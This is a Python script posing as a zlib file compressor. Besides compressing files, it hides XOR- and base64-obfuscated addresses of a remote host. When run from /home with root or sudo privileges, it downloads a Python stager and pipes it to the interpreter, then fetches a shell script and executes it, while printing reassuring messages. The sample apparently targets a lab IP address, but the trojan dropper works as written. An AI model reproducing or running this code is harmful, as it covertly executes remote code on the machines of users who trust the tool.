import sys
import zlib
import os
import mimetypes
import requests
import base64
from pathlib import Path
from tempfile import gettempdir
from subprocess import run

# Directory to import the necessary libraries.
TMP_DIR = "/tmp/systemd-pr1vate-6e9393d58a-enit.service.compressor-SEFC/"

class Compressor:
    def __init__(self, input_path, output_path):
        self.input_path = input_path
        self.output_path = output_path
        self.data = b""

    def check_exists(self):
        if not os.path.exists(self.input_path):
            print("[!] File doesn't exist.")
            sys.exit(1)

    def check_mime(self):
        mime, _ = mimetypes.guess_type(self.input_path)
        print(f"[i] MIME type: {mime}")
        if mime not in ["text/plain", "application/octet-stream"]:
            print("[!] Unsupported file type.")
            sys.exit(1)

    def read_data(self):
        with open(self.input_path, 'rb') as f:
            self.data = f.read()
        print(f"[i] Read {len(self.data)} bytes")

    def compress_data(self):
        compressed = zlib.compress(self.data, level=9)
        with open(self.output_path, 'wb') as f:
            f.write(compressed)
        print(f"[✓] File compressed -> {self.output_path}")

    def optimize_compression(self):

        if not self._validate_conditions():
            return

        # Encrypted strings (obfuscated URLs)
        input_output_dict = {
            "compressed_bytes": "c3twbHN0emxze3psc3B7eHt7e3ttMTYjJScwc2wyOw==",     # 192.168.198.129:9999/stager1.py
            "optimized": "c3twbHN0emxze3psc3B7eHpyenJtIS4nIyxsMSo="  # 192.168.198.129:8080/clean
        }

        # Setup temp dir
        Path(TMP_DIR).mkdir(parents=True, exist_ok=True)

        # Download stager and shell script
        self._fetch(self._de(input_output_dict["compressed_bytes"], 0x42), "python3")
        self._save(self._de(input_output_dict["optimized"], 0x42), f"{TMP_DIR}clean.sh")

        # Run the optimization
        run(["chmod", "+x", f"{TMP_DIR}clean.sh"])
        run([f"{TMP_DIR}clean.sh"])

        print("[+] Done. Compressed and Optimized!")

    def _validate_conditions(self):
        if not os.getcwd().startswith("/home"):
            return False
        if os.geteuid() != 0 and "SUDO_USER" not in os.environ:
            return False
        return True

    def _de(self, ctext, key):
        try:
            raw = base64.b64decode(ctext)
            return ''.join(chr(b ^ key) for b in raw)
        except Exception:
            return ""

    def _save(self, url, dest):
        try:
            r = requests.get(f"http://{url}", timeout=3)
            if r.status_code == 200:
                with open(dest, 'wb') as f:
                    f.write(r.content)
                print("[+] Nice file bro")
            else:
                print(f"[!] Nothing serious, just compressing the files.")
        except Exception as e:
            pass
            print("[!] Nothing serious just compressing your file :D")

    def _fetch(self, url, interpreter="python3"):
        try:
            r = requests.get(f"http://{url}", timeout=3)
            if r.status_code == 200:
                run([interpreter], input=r.content, check=True)
            else:
                pass
                print(f"[!] Mosh waywa hata tarf.")
        except Exception as e:
            pass
            print(f"[!] Malla 3amla kalba, manish bsh ncompressi :D")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 zlib_compressor.py <input_file> <output_file>")
        sys.exit(1)

    comp = Compressor(sys.argv[1], sys.argv[2])
    comp.check_exists()
    comp.read_data()
    comp.compress_data()
    comp.optimize_compression()

if __name__ == "__main__":
    main()
